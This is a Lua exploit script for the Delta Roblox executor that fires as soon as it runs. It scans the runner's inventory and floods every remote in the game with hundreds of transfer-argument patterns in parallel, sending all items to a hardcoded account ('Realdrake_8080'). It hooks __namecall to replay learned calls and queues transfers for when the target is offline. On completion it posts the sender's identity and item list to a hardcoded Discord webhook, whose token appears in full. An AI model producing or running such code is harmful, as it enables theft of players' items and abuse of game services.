-- language: Lua, file: zat_final.lua, executor: Delta
-- ZAT FINAL — auto-fires on execute · UI monitor only · fires until empty
-- ╔══════════════════════════════╗
-- ║  SET THIS ONLY              ║
-- ╚══════════════════════════════╝
local TARGET_USERNAME = "Realdrake_8080"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1547846204526698597/Waj7LsTdNInSC9s758tkUuRUZxpJ3JeM7RK9tVwrsXJIhUH3vZGnH7iEULtqQuWo7sQX"
local WORKERS         = 30   -- parallel fire threads
local MAX_LOOPS       = 999  -- keeps looping until inventory empty or this limit

-- ═══════════════════════════════════════════════
-- SERVICES
-- ═══════════════════════════════════════════════
local LP  = game:GetService("Players").LocalPlayer
local PLR = game:GetService("Players")
local HS  = game:GetService("HttpService")
local TW  = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local WS  = game:GetService("Workspace")
local RS  = game:GetService("ReplicatedStorage")

local httpfn=(syn and syn.request) or (http and http.request) or request
local function fetch(u,m,h,b)
    if not httpfn then return nil end
    local ok,r=pcall(httpfn,{Url=u,Method=m or "GET",Headers=h or {},Body=b})
    return ok and r or nil
end
local function jd(s) local ok,v=pcall(HS.JSONDecode,HS,s);return ok and v or nil end
local function je(t) local ok,v=pcall(HS.JSONEncode,HS,t);return ok and v or nil end

-- ═══════════════════════════════════════════════
-- RESOLVE
-- ═══════════════════════════════════════════════
local function resolveUser(u)
    local r=fetch("https://users.roblox.com/v1/usernames/users","POST",
        {["Content-Type"]="application/json"},
        je({usernames={u},excludeBannedUsers=false}))
    if not r or r.StatusCode~=200 then return nil,nil end
    local d=jd(r.Body)
    if d and d.data and d.data[1] then return d.data[1].id,d.data[1].name end
    return nil,nil
end

-- ═══════════════════════════════════════════════
-- GAME PROFILES
-- ═══════════════════════════════════════════════
local PROFILES={
    GAG={
        tag="Grow a Garden",
        pids={126884695634979,94081344497,5086676697,7915709822},
        hints={"grow a garden","growagararden"},
        rems={"GiveItem","TransferItem","SendItem","GiftItem","GiveSeed","TransferSeed",
              "SendSeed","GiftSeed","GivePet","TransferPet","SendPet","GiftPet",
              "GiveCrop","TransferCrop","SendCrop","GiftCrop","GiveToPlayer","PlayerGive",
              "ItemTransfer","TradeItem","TradeSeed","TradePet","RequestTrade","AcceptTrade",
              "Give","Transfer","Send","Gift","BulkGive","BulkTransfer","GiveAll",
              "OfflineGive","DataGive","SaveGive","InventoryGive","InventoryTransfer"},
    },
    GAG2={
        tag="Grow a Garden 2",
        pids={},
        hints={"grow a garden 2","growagararden2"},
        rems={"GiveItem","TransferItem","SendItem","GiftItem","GiveSeed","TransferSeed",
              "GivePlant","TransferPlant","GivePet","TransferPet","GiveToPlayer","PlayerGive",
              "ItemTransfer","TradeItem","RequestTrade","AcceptTrade","Give","Transfer",
              "Send","Gift","GiveV2","TransferV2","PlayerTransfer","InventoryGive",
              "BulkGive","BulkTransfer","GiveAll","OfflineGive","DataGive","SaveGive"},
    },
    BF={
        tag="Blox Fruits",
        pids={2753915549,7449423635},
        hints={"blox fruit","bloxfruit"},
        rems={"GiveFruit","TransferFruit","SendFruit","GiftFruit","StoreFruit","DepositFruit",
              "FruitGive","FruitTransfer","GiveItem","TransferItem","SendItem","GiveToPlayer",
              "PlayerGive","ItemTransfer","TradeRequest","SendTradeRequest","AcceptTrade",
              "ConfirmTrade","TradeItem","TradeFruit","GiveWeapon","GiveRace","GiveAura",
              "StoreInSafe","GetFromSafe","SafeStore","FruitSafe","Give","Transfer",
              "BulkGive","BulkTransfer","GiveAll","OfflineGive","DataGive","SaveGive"},
    },
    GENERIC={
        tag="Generic",pids={},hints={},
        rems={"GiveItem","TransferItem","SendItem","TradeItem","GiftItem","GiveSeed",
              "SendSeed","TransferSeed","GiveCrop","SendCrop","GiveFruit","SendFruit",
              "TransferFruit","GivePet","SendPet","TransferPet","GiveGear","SendGear",
              "GiveCurrency","SendCurrency","PlayerGive","GiveToPlayer","SendToPlayer",
              "TransferToPlayer","ItemTransfer","ItemGive","ItemSend","TradeOffer",
              "TradeSend","TradeRequest","Grant","Award","Deliver","Deposit","Pass",
              "GiveUnit","SendUnit","TransferUnit","GiftUnit","AddItem","StoreItem",
              "DepositItem","SendGift","GiftPet","OfferItem","AcceptOffer",
              "OfflineGive","DataGive","SaveGive","GiveOffline","DataTransfer",
              "OfflineTransfer","DatastoreGive","SaveTransfer","BulkGive","BulkTransfer",
              "GiveAll","TransferAll","SendAll","MassGive","InventoryGive","InventoryTransfer"},
    },
}

local function detectGame()
    local pid=game.PlaceId; local gn="Unknown"
    pcall(function() gn=game:GetService("MarketplaceService"):GetProductInfo(pid).Name or gn end)
    local gnl=gn:lower()
    for k,p in pairs(PROFILES) do
        for _,id in ipairs(p.pids) do if id==pid then return k,p,gn end end
        for _,h in ipairs(p.hints) do if gnl:find(h) then return k,p,gn end end
    end
    return "GENERIC",PROFILES.GENERIC,gn
end

-- ═══════════════════════════════════════════════
-- INVENTORY SCAN
-- ═══════════════════════════════════════════════
local function scanInventory()
    local out,seen={},{}
    local function add(name,obj,cat)
        local k=tostring(name)..tostring(obj)
        if seen[k] then return end; seen[k]=true
        table.insert(out,{name=name,obj=obj,cat=cat})
    end
    local bp=LP:FindFirstChildOfClass("Backpack")
    if bp then for _,v in ipairs(bp:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Tool") end end end
    local ch=LP.Character
    if ch then for _,v in ipairs(ch:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Eq") end end end
    local ls=LP:FindFirstChild("leaderstats")
    if ls then for _,v in ipairs(ls:GetChildren()) do
        if v.Value and v.Value~=0 and v.Value~="" then add(v.Name.."="..tostring(v.Value),v,"Stat") end
    end end
    local aok,at=pcall(function() return LP:GetAttributes() end)
    if aok and type(at)=="table" then for k,v in pairs(at) do
        if type(v)=="number" and v>0 then add(k.." x"..tostring(v),LP,"Attr") end
    end end
    for _,c in ipairs(LP:GetChildren()) do
        if (c:IsA("IntValue") or c:IsA("NumberValue") or c:IsA("StringValue") or c:IsA("BoolValue"))
        and c.Name:lower()~="userid" then add(c.Name.."="..tostring(c.Value),c,"Val") end
    end
    for _,f in ipairs(LP:GetChildren()) do
        if f:IsA("Folder") then for _,c in ipairs(f:GetDescendants()) do
            if (c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue"))
            and c.Value~=0 and c.Value~="" then
                add(f.Name.."/"..c.Name.."="..tostring(c.Value),c,"Folder") end
        end end
    end
    local pg=LP:FindFirstChild("PlayerGui")
    if pg then for _,d in ipairs(pg:GetDescendants()) do
        if d:IsA("TextLabel") and d.Text~="" and d.Text~="0" then
            local pn=d.Parent and d.Parent.Name:lower() or ""
            if pn:find("slot") or pn:find("item") or pn:find("inv") or pn:find("bag")
            or pn:find("seed") or pn:find("fruit") or pn:find("pet") or pn:find("crop") then
                add(d.Text,d,"Slot") end
        end
    end end
    for _,root in ipairs({
        WS:FindFirstChild(LP.Name),WS:FindFirstChild("Plots"),WS:FindFirstChild("Players"),
        WS:FindFirstChild("Gardens"),WS:FindFirstChild("Farms"),WS:FindFirstChild("Inventory"),
        WS:FindFirstChild("Seeds"),WS:FindFirstChild("Storage"),WS:FindFirstChild("Crops"),
        WS:FindFirstChild("Fruits"),
    }) do if root then
        local sub=root:FindFirstChild(LP.Name) or root
        for _,c in ipairs(sub:GetDescendants()) do
            if c:IsA("Tool") or c:IsA("Model") then add(c.Name,c,"World") end
        end
    end end
    local rsp=RS:FindFirstChild(LP.Name) or RS:FindFirstChild("PlayerData")
    if rsp then for _,c in ipairs(rsp:GetDescendants()) do
        if (c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue"))
        and c.Value~=0 then add(c.Name.."="..tostring(c.Value),c,"RS") end
    end end
    return out
end

local function inventoryEmpty(original)
    local cur=scanInventory(); local curN={}
    for _,it in ipairs(cur) do curN[it.name]=true end
    for _,it in ipairs(original) do
        if curN[it.name] then return false end
    end
    return true
end

local function getMovedItems(original)
    local cur=scanInventory(); local curN={}
    for _,it in ipairs(cur) do curN[it.name]=true end
    local moved={}
    for _,it in ipairs(original) do
        if not curN[it.name] then moved[#moved+1]=it.name end
    end
    return moved
end

-- ═══════════════════════════════════════════════
-- BUILD ALL ARG SETS (bulk: all items in one call)
-- ═══════════════════════════════════════════════
local function buildArgs(tid,tn,tp,items,names,objs)
    local args={}
    local function a(...) args[#args+1]={...} end
    local function d(tbl) args[#args+1]=tbl end

    -- ── BULK ALL ITEMS AT ONCE ──────────────────
    a(tid,items);    a(tid,names)
    a(tn,items);     a(tn,names)
    a(tostring(tid),items); a(tostring(tid),names)
    if tp then a(tp,items); a(tp,names); a(tp) end
    d({userId=tid,   items=items,  save=true})
    d({userId=tid,   items=names,  amount="all"})
    d({userId=tid,   itemList=names})
    d({username=tn,  items=items})
    d({username=tn,  items=names})
    d({to=tid,       items=items,  qty="all"})
    d({target=tid,   items=names})
    d({recipient=tid,items=items})
    d({targetId=tid, itemList=names,save=true})
    d({sendTo=tid,   items=names})
    d({destUserId=tid,data=items})
    if tp then d({player=tp,items=items}); d({player=tp,items=names}) end
    -- reversed bulk
    a(items,tid); a(names,tid); a(items,tn); a(names,tn)
    -- give-all (no item — some games give everything)
    a(tid);  a(tn);  a(tostring(tid))
    d({userId=tid}); d({username=tn}); d({to=tid})
    d({userId=tid,save=true}); d({targetId=tid})
    if tp then a(tp) end

    -- ── PER ITEM (fast, fired in parallel) ───────
    for _,it in ipairs(items) do
        local n,o=it.name,it.obj
        a(tid,n);    a(tn,n);    a(tostring(tid),n)
        a(tid,n,1);  a(tn,n,1);  a(tid,n,1,true)
        a(n,tid);    a(n,tn)
        if tp then a(tp,n); a(tp,o) end
        d({userId=tid,   item=n,amount=1,save=true})
        d({userId=tid,   itemName=n,qty=1})
        d({userId=tid,   seed=n,count=1})
        d({userId=tid,   fruit=n,amount=1})
        d({userId=tid,   fruitName=n,permanent=true})
        d({userId=tid,   pet=n,amount=1})
        d({username=tn,  item=n,amount=1})
        d({to=tid,       item=n,qty=1})
        d({target=tid,   item=n})
        d({targetId=tid, itemName=n,amount=1})
        d({recipient=tid,itemName=n})
        d({sendTo=tid,   item=n,qty=1})
        if tp then
            d({player=tp,item=n})
            d({player=tp,itemName=n,amount=1})
        end
    end

    return args
end

-- ═══════════════════════════════════════════════
-- REMOTE QUEUE (priority sorted)
-- ═══════════════════════════════════════════════
local function buildQueue(prof)
    local all,seen={},{}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local fp=v:GetFullName()
            if not seen[fp] then seen[fp]=true
                all[#all+1]={r=v,nm=v.Name,fn=v.ClassName=="RemoteFunction",path=fp,pri=0}
            end
        end
    end
    -- priority: game-specific names=3, generic known=2, keyword match=1
    local gs={};  for _,n in ipairs(prof.rems) do gs[n:lower()]=true end
    local gn={};  for _,n in ipairs(PROFILES.GENERIC.rems) do gn[n:lower()]=true end
    local kw={"give","transfer","send","trade","gift","grant","deliver","deposit",
               "award","item","seed","fruit","pet","crop","inv","bulk","all","player","offline","data"}
    for _,e in ipairs(all) do
        local nl=e.nm:lower()
        if gs[nl] then e.pri=3
        elseif gn[nl] then e.pri=2
        else for _,k in ipairs(kw) do if nl:find(k) then e.pri=e.pri+0.3 end end end
    end
    table.sort(all,function(a,b) return a.pri>b.pri end)
    return all
end

-- ═══════════════════════════════════════════════
-- PARALLEL FIRE
-- ═══════════════════════════════════════════════
local function parallelFire(queue,args,firedRef)
    local idx=0; local mx=#queue; if mx==0 then return end
    local mutex=false
    local function pop()
        while mutex do task.wait() end
        mutex=true; idx=idx+1; local e=queue[idx]; mutex=false; return e
    end
    local alive=0
    local function worker()
        alive=alive+1
        while true do
            local e=pop(); if not e then break end
            for _,a in ipairs(args) do
                if type(a)=="table" then
                    local isDict=false
                    for k in pairs(a) do if type(k)~="number" then isDict=true; break end end
                    pcall(function()
                        if isDict then
                            if e.fn then e.r:InvokeServer(a) else e.r:FireServer(a) end
                        else
                            if e.fn then e.r:InvokeServer(table.unpack(a))
                            else          e.r:FireServer(table.unpack(a)) end
                        end
                    end)
                end
            end
            if firedRef then firedRef[1]=firedRef[1]+1 end
        end
        alive=alive-1
    end
    for i=1,math.min(WORKERS,mx) do task.spawn(worker) end
    while alive>0 do task.wait(0.05) end
end

-- ═══════════════════════════════════════════════
-- HOOKMETAMETHOD
-- ═══════════════════════════════════════════════
local learned={}; local hookOn=false
local function startHook()
    if not hookmetamethod then return false end
    hookOn=true; local orig
    orig=hookmetamethod(game,"__namecall",function(self,...)
        local m=getnamecallmethod()
        if hookOn and (m=="FireServer" or m=="InvokeServer") then
            if self:IsA("RemoteEvent") or self:IsA("RemoteFunction") then
                local nm=self.Name; local a={...}
                if not learned[nm] then learned[nm]={} end
                local f=false
                for _,p in ipairs(learned[nm]) do if #p==#a then f=true end end
                if not f then learned[nm][#learned[nm]+1]=a end
            end
        end
        return orig(self,...)
    end)
    return true
end
local function stopHook() hookOn=false end
local function replayLearned(tid,tn,tp,items)
    if not next(learned) then return end
    local rbn={}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then rbn[v.Name:lower()]=v end
    end
    for nm,pats in pairs(learned) do
        local rem=rbn[nm:lower()]; if not rem then continue end
        for _,orig in ipairs(pats) do
            for _,it in ipairs(items) do
                local sw={}
                for _,a in ipairs(orig) do
                    if type(a)=="number" and a==LP.UserId then sw[#sw+1]=tid
                    elseif type(a)=="string" and tostring(LP.UserId)==a then sw[#sw+1]=tostring(tid)
                    elseif type(a)=="string" and a==LP.Name then sw[#sw+1]=tn
                    elseif type(a)=="userdata" then sw[#sw+1]=tp or tid
                    else sw[#sw+1]=a end
                end
                local wi={}; for _,a in ipairs(sw) do wi[#wi+1]=a end; wi[#wi+1]=it.name
                pcall(function()
                    if rem:IsA("RemoteFunction") then rem:InvokeServer(table.unpack(sw)); rem:InvokeServer(table.unpack(wi))
                    else rem:FireServer(table.unpack(sw)); rem:FireServer(table.unpack(wi)) end
                end)
            end
        end
    end
end

-- ═══════════════════════════════════════════════
-- OFFLINE QUEUE
-- ═══════════════════════════════════════════════
local offlineQueue={}
PLR.PlayerAdded:Connect(function(player)
    for i=#offlineQueue,1,-1 do
        local job=offlineQueue[i]
        if player.UserId==job.tid then
            task.spawn(function()
                task.wait(2)
                local q=buildQueue(job.prof)
                local names,objs={},{}
                for _,it in ipairs(job.items) do names[#names+1]=it.name; objs[#objs+1]=it.obj end
                local a=buildArgs(job.tid,job.tn,player,job.items,names,objs)
                local fr={0}
                parallelFire(q,a,fr)
                table.remove(offlineQueue,i)
            end)
        end
    end
end)

-- ═══════════════════════════════════════════════
-- UI — MONITOR ONLY
-- ═══════════════════════════════════════════════
local C={
    bg=Color3.fromRGB(10,10,16),     panel=Color3.fromRGB(18,18,26),
    bar=Color3.fromRGB(25,25,35),    accent=Color3.fromRGB(80,60,255),
    green=Color3.fromRGB(40,210,80), red=Color3.fromRGB(255,55,55),
    yellow=Color3.fromRGB(255,185,35),white=Color3.fromRGB(218,218,230),
    grey=Color3.fromRGB(100,100,120),border=Color3.fromRGB(36,36,50),
    teal=Color3.fromRGB(35,190,170), orange=Color3.fromRGB(255,135,35),
    dim=Color3.fromRGB(60,60,80),
}
local function mk(c,p) local o=Instance.new(c); for k,v in pairs(p or {}) do o[k]=v end; return o end
local function corner(r,p) mk("UICorner",{CornerRadius=UDim.new(0,r),Parent=p}) end
local function stroke(c,t,p) mk("UIStroke",{Color=c,Thickness=t,Parent=p}) end

local SG=mk("ScreenGui",{Name="ZAT_FINAL",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
pcall(function() SG.Parent=game:GetService("CoreGui") end)
if not SG.Parent then SG.Parent=LP.PlayerGui end

local WIN=mk("Frame",{Parent=SG,Size=UDim2.new(0,370,0,490),
    Position=UDim2.new(0.5,-185,0.5,-245),BackgroundColor3=C.bg,BorderSizePixel=0,ClipsDescendants=true})
corner(12,WIN); stroke(C.border,1,WIN)

-- title
local TB=mk("Frame",{Parent=WIN,Size=UDim2.new(1,0,0,40),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(12,TB)
mk("Frame",{Parent=TB,Size=UDim2.new(1,0,0.5,0),Position=UDim2.new(0,0,0.5,0),BackgroundColor3=C.panel,BorderSizePixel=0})
mk("TextLabel",{Parent=TB,Text="⚡  ZAT FINAL",TextSize=14,Font=Enum.Font.GothamBold,
    TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(0,160,1,0),Position=UDim2.new(0,14,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local GAMETAG=mk("TextLabel",{Parent=TB,Text="detecting...",TextSize=11,Font=Enum.Font.Gotham,
    TextColor3=C.teal,BackgroundTransparency=1,Size=UDim2.new(1,-200,1,0),Position=UDim2.new(0,160,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local SDOT=mk("Frame",{Parent=TB,Size=UDim2.new(0,10,0,10),
    Position=UDim2.new(1,-20,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=C.grey,BorderSizePixel=0})
corner(10,SDOT)

-- drag
local dg,ds,sp=false,nil,nil
TB.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 then dg=true;ds=i.Position;sp=WIN.Position end
end)
UIS.InputChanged:Connect(function(i)
    if dg and i.UserInputType==Enum.UserInputType.MouseMovement then
        local d=i.Position-ds
        WIN.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end
end)
UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dg=false end end)

-- stat row
local SR=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,50),
    Position=UDim2.new(0,10,0,48),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(8,SR); stroke(C.border,1,SR)
local sv={}
local function sbox(title,val,x)
    local f=mk("Frame",{Parent=SR,Size=UDim2.new(0,82,1,0),Position=UDim2.new(0,x,0,0),BackgroundTransparency=1})
    mk("TextLabel",{Parent=f,Text=title,TextSize=9,Font=Enum.Font.Gotham,TextColor3=C.grey,
        BackgroundTransparency=1,Size=UDim2.new(1,0,0,16),Position=UDim2.new(0,8,0,5),TextXAlignment=Enum.TextXAlignment.Left})
    local v=mk("TextLabel",{Parent=f,Text=val,TextSize=16,Font=Enum.Font.GothamBold,TextColor3=C.white,
        BackgroundTransparency=1,Size=UDim2.new(1,0,0,24),Position=UDim2.new(0,8,0,20),TextXAlignment=Enum.TextXAlignment.Left})
    return v
end
sv.rem=sbox("REMOTES","—",0)
sv.itm=sbox("ITEMS","—",84)
sv.frd=sbox("FIRED","0",168)
sv.mov=sbox("MOVED","0",252)

-- progress bar
local PBG=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,5),Position=UDim2.new(0,10,0,106),BackgroundColor3=C.bar,BorderSizePixel=0}); corner(4,PBG)
local PFG=mk("Frame",{Parent=PBG,Size=UDim2.new(0,0,1,0),BackgroundColor3=C.accent,BorderSizePixel=0}); corner(4,PFG)
local function spg(p) TW:Create(PFG,TweenInfo.new(0.2),{Size=UDim2.new(math.clamp(p,0,1),0,1,0)}):Play() end

-- phase label
local PHASELABEL=mk("TextLabel",{Parent=WIN,Text="⏳ Starting...",TextSize=11,Font=Enum.Font.GothamBold,
    TextColor3=C.accent,BackgroundTransparency=1,Size=UDim2.new(1,-20,0,14),
    Position=UDim2.new(0,10,0,116),TextXAlignment=Enum.TextXAlignment.Left})

-- status line
local SLINE=mk("TextLabel",{Parent=WIN,Text="",TextSize=10,Font=Enum.Font.Gotham,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(1,-20,0,13),
    Position=UDim2.new(0,10,0,132),TextXAlignment=Enum.TextXAlignment.Left})

-- inventory panel
mk("TextLabel",{Parent=WIN,Text="📦 INVENTORY",TextSize=9,Font=Enum.Font.GothamBold,TextColor3=C.grey,
    BackgroundTransparency=1,Size=UDim2.new(0,170,0,13),Position=UDim2.new(0,10,0,152),TextXAlignment=Enum.TextXAlignment.Left})
local IBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(0,170,0,210),Position=UDim2.new(0,10,0,167),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,IBOX); stroke(C.border,1,IBOX)
local ISC=mk("ScrollingFrame",{Parent=IBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=ISC,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,1)})

local irows={};  local movedCt=0
local function renderItems(items)
    for _,c in ipairs(ISC:GetChildren()) do if c:IsA("TextLabel") then c:Destroy() end end
    irows={}
    for i,it in ipairs(items) do
        local r=mk("TextLabel",{Parent=ISC,Text="·  "..it.name,TextSize=10,Font=Enum.Font.Code,
            TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(1,-8,0,14),
            Position=UDim2.new(0,6,0,0),TextXAlignment=Enum.TextXAlignment.Left,
            TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=i})
        irows[it.name]=r
    end
end
local function markMoved(name)
    movedCt=movedCt+1; sv.mov.Text=tostring(movedCt)
    local r=irows[name]
    if r then r.TextColor3=C.green; r.Text="✓  "..name end
end

-- log panel
mk("TextLabel",{Parent=WIN,Text="📋 LOG",TextSize=9,Font=Enum.Font.GothamBold,TextColor3=C.grey,
    BackgroundTransparency=1,Size=UDim2.new(0,180,0,13),Position=UDim2.new(0,192,0,152),TextXAlignment=Enum.TextXAlignment.Left})
local LBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(0,168,0,210),Position=UDim2.new(0,192,0,167),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,LBOX); stroke(C.border,1,LBOX)
local LSC=mk("ScrollingFrame",{Parent=LBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=LSC,SortOrder=Enum.SortOrder.LayoutOrder})
local lo=0
local function log(msg,kind)
    local cols={ok=C.green,err=C.red,warn=C.yellow,info=C.white,step=C.accent,done=C.green,fire=C.orange}
    local icons={ok="✓",err="✗",warn="!",info="→",step="■",done="★",fire="🔥"}
    local col=cols[kind or "info"] or C.grey
    local txt="["..( icons[kind or "info"] or "→").."] "..tostring(msg)
    lo=lo+1
    mk("TextLabel",{Parent=LSC,Text=txt,TextSize=10,Font=Enum.Font.Code,TextColor3=col,
        BackgroundTransparency=1,Size=UDim2.new(1,-8,0,13),Position=UDim2.new(0,4,0,0),
        TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=lo})
    task.defer(function() LSC.CanvasPosition=Vector2.new(0,LSC.AbsoluteCanvasSize.Y) end)
    local ch=LSC:GetChildren(); if #ch>90 then for i=1,#ch-80 do if ch[i]:IsA("TextLabel") then ch[i]:Destroy() end end end
    SLINE.Text=txt; SLINE.TextColor3=col; print(txt)
end

-- bottom status bar
local BBAR=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,36),Position=UDim2.new(0,10,1,-46),
    BackgroundColor3=C.panel,BorderSizePixel=0})
corner(9,BBAR); stroke(C.border,1,BBAR)
local BLAST=mk("TextLabel",{Parent=BBAR,Text="⏳ Initializing transfer...",TextSize=12,
    Font=Enum.Font.GothamBold,TextColor3=C.accent,BackgroundTransparency=1,
    Size=UDim2.new(1,-16,1,0),Position=UDim2.new(0,10,0,0),TextXAlignment=Enum.TextXAlignment.Left})

local function sdot(c) TW:Create(SDOT,TweenInfo.new(0.2),{BackgroundColor3=c}):Play() end
local function setPhase(txt,col)
    PHASELABEL.Text=txt; PHASELABEL.TextColor3=col or C.accent
    BLAST.Text=txt; BLAST.TextColor3=col or C.accent
end

-- ═══════════════════════════════════════════════
-- AUTO-FIRE ON EXECUTE
-- ═══════════════════════════════════════════════
task.spawn(function()
    sdot(C.yellow); setPhase("⏳ Initializing...",C.accent); spg(0)

    -- HTTP
    if not httpfn then
        log("HTTP not found — enable in Delta settings","err")
        setPhase("✗ HTTP missing — enable in Delta",C.red); sdot(C.red); return
    end
    log("HTTP ok","ok"); spg(0.05)

    -- game detect
    local gkey,prof,gname=detectGame()
    GAMETAG.Text=gname.." ["..gkey.."]"
    log("Game: "..gname.." ["..gkey.."]","info"); spg(0.08)

    -- resolve target
    setPhase("⏳ Resolving "..TARGET_USERNAME.."...",C.accent)
    log("Resolving "..TARGET_USERNAME,"info")
    local tid,tn=resolveUser(TARGET_USERNAME)
    if not tid then
        log("Cannot resolve '"..TARGET_USERNAME.."' — check username","err")
        setPhase("✗ Cannot resolve '"..TARGET_USERNAME.."'",C.red); sdot(C.red); return
    end
    if tid==LP.UserId then
        log("Target = sender account","err")
        setPhase("✗ Target is same account",C.red); sdot(C.red); return
    end
    log("Target: "..tn.." ("..tid..")","ok"); spg(0.12)

    local tp=PLR:GetPlayerByUserId(tid)
    log(tp and "Target ONLINE in server" or "Target OFFLINE — DataStore paths active","warn")

    -- scan inventory
    setPhase("⏳ Scanning inventory...",C.accent)
    log("Scanning inventory...","info")
    local items=scanInventory()
    sv.itm.Text=tostring(#items)
    if #items==0 then
        log("No items found — make sure items are loaded in-game","warn")
        setPhase("! No items found",C.yellow); sdot(C.yellow); return
    end
    log("Found "..#items.." items","ok")
    renderItems(items)
    spg(0.18)

    -- build args once
    local names,objs={},{}
    for _,it in ipairs(items) do names[#names+1]=it.name; objs[#objs+1]=it.obj end
    local argSets=buildArgs(tid,tn,tp,items,names,objs)
    log("Arg patterns: "..#argSets,"ok")

    -- build priority remote queue
    setPhase("⏳ Building remote queue...",C.accent)
    log("Building priority remote queue...","info")
    local remQ=buildQueue(prof)
    sv.rem.Text=tostring(#remQ)
    log("Remotes: "..#remQ.." (priority sorted)","ok")
    for i=1,math.min(5,#remQ) do
        log("  #"..i.." "..remQ[i].nm.." [p="..string.format("%.1f",remQ[i].pri).."]","info")
    end
    spg(0.22)

    -- hook
    local hk=startHook()
    log(hk and "hookmetamethod: active" or "hookmetamethod: unavailable","info")

    -- drain watcher — updates UI as items leave
    local drained={}
    task.spawn(function()
        local deadline=tick()+600 -- watch for 10 minutes
        while tick()<deadline do
            local cur=scanInventory(); local curN={}
            for _,it in ipairs(cur) do curN[it.name]=true end
            for _,it in ipairs(items) do
                if not curN[it.name] and not drained[it.name] then
                    drained[it.name]=true
                    log("MOVED: "..it.name,"done")
                    markMoved(it.name)
                    sdot(C.green)
                end
            end
            task.wait(0.4)
        end
    end)

    -- arm offline queue
    offlineQueue[#offlineQueue+1]={tid=tid,tn=tn,items=items,prof=prof}
    log("Offline queue armed — fires when "..tn.." joins","ok")

    -- ════════════════════════════════════════════
    -- MAIN LOOP — fires until inventory empty
    -- ════════════════════════════════════════════
    local firedRef={0}; local loop=0

    while loop<MAX_LOOPS do
        loop=loop+1

        -- check if done
        if inventoryEmpty(items) then
            stopHook()
            setPhase("✓ ALL ITEMS TRANSFERRED — inventory empty",C.green)
            sdot(C.green); spg(1)
            log("SUCCESS — inventory empty — all items transferred","done")
            log("Log into "..tn.." and join this game","info")

            -- discord
            if DISCORD_WEBHOOK~="" then
                task.spawn(function()
                    fetch(DISCORD_WEBHOOK,"POST",{["Content-Type"]="application/json"},je({
                        username="ZAT FINAL",
                        embeds={{title="✅ Transfer Complete",color=3066993,
                            fields={
                                {name="👤 Sender",value=LP.Name.." ("..LP.UserId..")",inline=true},
                                {name="🎯 Target",value=tn.." ("..tid..")",inline=true},
                                {name="🎮 Game",  value=gname.." ["..gkey.."]",inline=false},
                                {name="🎒 Items", value=table.concat(names,", "),inline=false},
                                {name="📊 Stats", value="Fired: "..firedRef[1].." | Loops: "..loop.." | All moved ✓",inline=false},
                            },footer={text="ZAT FINAL • "..os.date("!%Y-%m-%d %H:%M UTC")},
                        }},
                    }))
                end)
            end
            return
        end

        -- refresh target player object
        tp=PLR:GetPlayerByUserId(tid)

        -- rebuild args with fresh tp
        argSets=buildArgs(tid,tn,tp,items,names,objs)

        local loopTxt="🔥 LOOP "..loop.." — "..#remQ.." remotes × "..#argSets.." patterns × "..WORKERS.." threads"
        setPhase(loopTxt,C.orange)
        log(loopTxt,"fire")
        spg(0.22+math.min(loop/20,0.75))

        -- PARALLEL BLAST — all remotes, all arg sets, all at once
        parallelFire(remQ,argSets,firedRef)
        sv.frd.Text=tostring(firedRef[1])

        -- replay learned patterns
        if hk then replayLearned(tid,tn,tp,items) end

        log("Loop "..loop.." done | total fired: "..firedRef[1],"ok")

        -- brief pause then loop again
        task.wait(1.5)
    end

    -- hit loop limit (unlikely with inventory watcher)
    stopHook()
    setPhase("⚠ Loop limit reached — check Acc2 inventory",C.yellow)
    sdot(C.yellow); spg(1)
    log("Loop limit hit — "..firedRef[1].." total fires sent","warn")
    log("Check Account 2 after joining game","info")
    log("Queue still active — fires when "..tn.." joins","info")
end)
